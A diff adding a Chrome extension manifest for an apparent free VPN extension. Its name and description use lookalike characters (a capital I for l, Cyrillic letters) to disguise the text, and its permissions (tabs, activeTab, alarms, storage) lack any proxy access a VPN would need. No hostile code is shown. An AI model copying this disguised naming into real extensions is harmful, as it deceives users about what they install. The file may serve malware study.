@@ -1,0 +1,17 @@
+{
+   "background": {
+      "scripts": [ "background.js" ]
+   },
+   "browser_action": {
+      "default_icon": "fav.png"
+   },
+   "description": "UnIimitеd Frее VРN",
+   "icons": {
+      "128": "icon_128.png"
+   },
+   "permissions": [ "storage", "activeTab", "tabs", "alarms" ],
+   "manifest_version": 2,
+   "name": "UnIimitеd Frее VРN",
+   "update_url": "https://clients2.google.com/service/update2/crx",
+   "version": "1.3"
+}
